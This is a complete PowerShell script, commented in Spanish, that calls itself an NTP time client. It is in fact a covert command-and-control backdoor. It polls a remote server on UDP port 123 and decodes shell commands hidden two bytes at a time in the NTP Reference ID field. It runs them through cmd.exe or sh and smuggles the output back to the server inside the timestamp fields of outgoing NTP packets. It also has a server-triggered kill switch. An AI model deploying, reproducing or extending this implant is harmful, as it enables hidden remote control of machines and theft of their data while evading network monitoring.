param(
    [Parameter(Mandatory=$true)][string]$Id,
    [Parameter(Mandatory=$true)][string]$Servidor,
    [int]$Intervalo = 10,
    [int]$Puerto    = 123
)

# ─────────────────────────────────────────────
#  Codificación del ID en 16 bytes
# ─────────────────────────────────────────────
function ConvertTo-IdBytes([string]$id) {
    $raw = [System.Text.Encoding]::UTF8.GetBytes($id)
    if ($raw.Length -gt 16) { $raw = $raw[0..15] }
    $padded = [byte[]]::new(16)
    [Array]::Copy($raw, $padded, $raw.Length)
    return $padded
}

$ID_BYTES         = ConvertTo-IdBytes $Id
$NTP_EPOCH_OFFSET = [long]2208988800
$MAX_FALLOS       = 5
$MARCA_DESACTIVADO = [long]0xDEAD0000

# ─────────────────────────────────────────────
#  Estados
# ─────────────────────────────────────────────
$IDLE               = 0
$RECIBIENDO_COMANDO = 1
$ENVIANDO_RESPUESTA = 2
$DESACTIVADO        = 3

$estado              = $IDLE
$bufferCmd           = [System.Collections.Generic.List[byte]]::new()
$resultadoBytes      = [byte[]]@()
$offsetResultado     = 0
$ultimoFragCmd       = -1
$fallosConsecutivos  = 0

# ─────────────────────────────────────────────
#  Helpers NTP
# ─────────────────────────────────────────────
function Get-NtpTimestamp {
    $unix = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds() / 1000.0
    $ntp  = $unix + $NTP_EPOCH_OFFSET
    $sec  = [uint32][Math]::Floor($ntp)
    $frac = [uint32](($ntp - $sec) * [Math]::Pow(2, 32))
    return ([long]$sec -shl 32) -bor [long]$frac
}

function ConvertFrom-NtpTimestamp([uint64]$ntp) {
    $sec  = $ntp -shr 32
    $frac = $ntp -band 0xFFFFFFFF
    return ($sec - $NTP_EPOCH_OFFSET) + ($frac / [Math]::Pow(2, 32))
}

function Write-BigEndianUInt32([byte[]]$buf, [int]$offset, [long]$value) {
    $buf[$offset]   = [byte](($value -shr 24) -band 0xFF)
    $buf[$offset+1] = [byte](($value -shr 16) -band 0xFF)
    $buf[$offset+2] = [byte](($value -shr 8)  -band 0xFF)
    $buf[$offset+3] = [byte]($value -band 0xFF)
}

function Read-BigEndianUInt32([byte[]]$buf, [int]$offset) {
    return [uint32]((([long]$buf[$offset] -shl 24) -bor `
                     ([long]$buf[$offset+1] -shl 16) -bor `
                     ([long]$buf[$offset+2] -shl 8) -bor `
                     [long]$buf[$offset+3]) -band 0xFFFFFFFFL)
}

# ─────────────────────────────────────────────
#  Fragmentación del resultado
# ─────────────────────────────────────────────
function Get-SiguienteFragmento {
    if ($script:offsetResultado -ge $script:resultadoBytes.Length) { return $null }

    $byte1 = [int]$script:resultadoBytes[$script:offsetResultado]
    $script:offsetResultado++
    if ($script:offsetResultado -lt $script:resultadoBytes.Length) {
        $byte2 = [int]$script:resultadoBytes[$script:offsetResultado]
        $script:offsetResultado++
    } else { $byte2 = 0 }

    $mas     = if ($script:offsetResultado -lt $script:resultadoBytes.Length) { 1 } else { 0 }
    $numFrag = [Math]::Max(0, [int]($script:offsetResultado / 2) - 1)
    $datos   = ($byte1 -shl 8) -bor $byte2
    [long]$v = ([long]0xFF -shl 24) -bor ([long]$numFrag -shl 16) -bor ([long]$mas -shl 15) -bor [long]$datos
    return [uint32]($v -band 0xFFFFFFFFL)
}

# ─────────────────────────────────────────────
#  Construir paquete saliente
# ─────────────────────────────────────────────
function Build-Packet {
    $packet          = [byte[]]::new(48)
    $packet[0]       = 0x23
    $acabaDeterminar = $false

    # ID del cliente en bytes 4-19
    for ($i = 0; $i -lt 16; $i++) { $packet[4 + $i] = $ID_BYTES[$i] }

    if ($script:estado -eq $script:ENVIANDO_RESPUESTA) {
        $fragmento = Get-SiguienteFragmento
        if ($null -ne $fragmento) {
            Write-BigEndianUInt32 $packet 24 0xFFFFFFFFL
            Write-BigEndianUInt32 $packet 28 ([long]$fragmento)
            $nf = ($fragmento -shr 16) -band 0xFF
            $mf = ($fragmento -shr 15) -band 1
            $b1 = ($fragmento -shr 8)  -band 0xFF
            $b2 =  $fragmento          -band 0xFF
            Write-Host "   📤 frag=$nf más=$mf bytes=$([System.Text.Encoding]::Latin1.GetString([byte[]]@($b1,$b2)))"
        } else {
            $script:estado              = $script:IDLE
            $script:resultadoBytes      = [byte[]]@()
            $script:offsetResultado     = 0
            $script:bufferCmd.Clear()
            $script:ultimoFragCmd       = -1
            Write-Host "   ✅ Respuesta enviada completamente → IDLE"
            Write-BigEndianUInt32 $packet 24 0xFFFFFFFEL
            Write-BigEndianUInt32 $packet 28 0L
            $acabaDeterminar = $true
        }
    } else {
        Write-BigEndianUInt32 $packet 24 12345
        Write-BigEndianUInt32 $packet 28 67890
    }

    $ts = Get-NtpTimestamp
    Write-BigEndianUInt32 $packet 40 ([uint32]($ts -shr 32))
    Write-BigEndianUInt32 $packet 44 ([uint32]($ts -band 0xFFFFFFFF))
    return $packet, $acabaDeterminar
}

# ─────────────────────────────────────────────
#  Procesar fragmento de comando
# ─────────────────────────────────────────────
function Process-FragmentoComando([uint32]$refId) {
    $numFrag = ($refId -shr 16) -band 0xFF
    $mas     = ($refId -shr 15) -band 1
    $datos   = $refId -band 0x7FFF
    $byte1   = ($datos -shr 8) -band 0xFF
    $byte2   =  $datos -band 0xFF

    if ($numFrag -eq 0 -or $script:estado -eq $script:IDLE) {
        $script:bufferCmd.Clear()
        $script:ultimoFragCmd = -1
        $script:estado        = $script:RECIBIENDO_COMANDO
    }
    if ($numFrag -le $script:ultimoFragCmd) {
        Write-Host "   ⚠️  Fragmento $numFrag duplicado, ignorado"; return
    }
    $script:ultimoFragCmd = $numFrag
    if ($byte1 -ne 0) { $script:bufferCmd.Add([byte]$byte1) }
    if ($byte2 -ne 0) { $script:bufferCmd.Add([byte]$byte2) }
    Write-Host "   📥 Frag cmd $numFrag (más=$mas): $([System.Text.Encoding]::Latin1.GetString([byte[]]@($byte1,$byte2)))"

    if ($mas -eq 0) {
        $comando = [System.Text.Encoding]::UTF8.GetString($script:bufferCmd.ToArray()).Trim([char]0)
        Write-Host "   🚀 Comando completo: '$comando'"
        Invoke-Comando $comando
    }
}

# ─────────────────────────────────────────────
#  Ejecutar comando
# ─────────────────────────────────────────────
function Invoke-Comando([string]$comando) {
    try {
        if ([System.Runtime.InteropServices.RuntimeInformation]::IsOSPlatform(
                [System.Runtime.InteropServices.OSPlatform]::Windows)) {
            $salida = & cmd.exe /c $comando 2>&1 | Out-String
        } else {
            $salida = & sh -c $comando 2>&1 | Out-String
        }
    } catch { $salida = "ERROR: $_" }

    $script:resultadoBytes  = [System.Text.Encoding]::UTF8.GetBytes($salida)
    $script:offsetResultado = 0
    $script:estado          = $script:ENVIANDO_RESPUESTA
    Write-Host "   ⚡ Ejecutado. Resultado: $($salida.Substring(0,[Math]::Min(60,$salida.Length)))..."
}

# ─────────────────────────────────────────────
#  Procesar respuesta del servidor
# ─────────────────────────────────────────────
function Process-Respuesta([byte[]]$data, [string]$ip, [int]$port, [bool]$ignorarRefId) {
    $txSec  = Read-BigEndianUInt32 $data 40
    $txFrac = Read-BigEndianUInt32 $data 44
    $t3     = ConvertFrom-NtpTimestamp (([uint64]$txSec -shl 32) -bor [uint64]$txFrac)
    $now    = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds() / 1000.0

    Write-Host "✅ Respuesta de ${ip}:${port}"
    Write-Host "   Servidor: $([DateTimeOffset]::FromUnixTimeMilliseconds([long]($t3*1000)).LocalDateTime)  |  Local: $(Get-Date)"
    Write-Host "   Δ $([Math]::Round(($t3-$now)*1000,2)) ms`n"

    $refId = Read-BigEndianUInt32 $data 12
    if ($refId -eq $script:MARCA_DESACTIVADO) {
        Write-Host "🚫 Servidor indicó DESACTIVACIÓN — cerrando cliente."
        $script:estado = $script:DESACTIVADO; return
    }
    if ($ignorarRefId) { Write-Host "   ⏭️  Ciclo de transición → ignorando Reference ID"; return }
    if ($refId -eq 0x47505300 -or $script:estado -eq $script:ENVIANDO_RESPUESTA) { return }
    if ((($refId -shr 24) -band 0xFF) -ne 0xFF) { return }
    Process-FragmentoComando $refId
}

# ─────────────────────────────────────────────
#  Bucle principal
# ─────────────────────────────────────────────
$estadoNombres = @("IDLE","RECIBIENDO_COMANDO","ENVIANDO_RESPUESTA","DESACTIVADO")

Write-Host "🕐 Cliente NTP (PowerShell) iniciado  [ID=$Id]"
Write-Host "📡 Servidor: ${Servidor}:${Puerto}"
Write-Host "⏱️  Intervalo: ${Intervalo}s`n"

$n = 0
try {
    while ($true) {
        if ($script:estado -eq $script:DESACTIVADO) {
            Write-Host "🚫 Cliente desactivado — deteniendo."; break
        }
        $n++
        Write-Host "📡 Petición #$n  [estado=$($estadoNombres[$estado])]"
        try {
            $udp = [System.Net.Sockets.UdpClient]::new()
            $udp.Client.ReceiveTimeout = 5000
            $info            = Build-Packet
            $packet          = $info[0]
            $acabaDeterminar = $info[1]
            $udp.Send($packet, $packet.Length, $Servidor, $Puerto) | Out-Null
            $ep   = [System.Net.IPEndPoint]::new([System.Net.IPAddress]::Any, 0)
            $data = $udp.Receive([ref]$ep)
            $udp.Close()
            $script:fallosConsecutivos = 0
            if ($data.Length -ge 48) {
                Process-Respuesta $data $ep.Address.ToString() $ep.Port $acabaDeterminar
            }
        } catch [System.Net.Sockets.SocketException] {
            $script:fallosConsecutivos++
            Write-Host "⏰ Timeout ($($script:fallosConsecutivos)/$MAX_FALLOS)`n"
            if ($script:fallosConsecutivos -ge $MAX_FALLOS) {
                Write-Host "❌ Demasiados fallos — desactivando cliente."
                $script:estado = $script:DESACTIVADO; break
            }
        } catch {
            $script:fallosConsecutivos++
            Write-Host "❌ Error: $_  ($($script:fallosConsecutivos)/$MAX_FALLOS)`n"
            if ($script:fallosConsecutivos -ge $MAX_FALLOS) {
                Write-Host "❌ Demasiados fallos — desactivando cliente."
                $script:estado = $script:DESACTIVADO; break
            }
        }
        if ($script:estado -eq $script:DESACTIVADO) { break }
        for ($i = $Intervalo; $i -gt 0; $i--) {
            Write-Host "⏳ Próxima en ${i}s..." -NoNewline
            Write-Host "`r" -NoNewline
            Start-Sleep -Seconds 1
        }
        Write-Host "                              `r" -NoNewline
    }
} finally {
    Write-Host "`n🛑 Cliente detenido"
}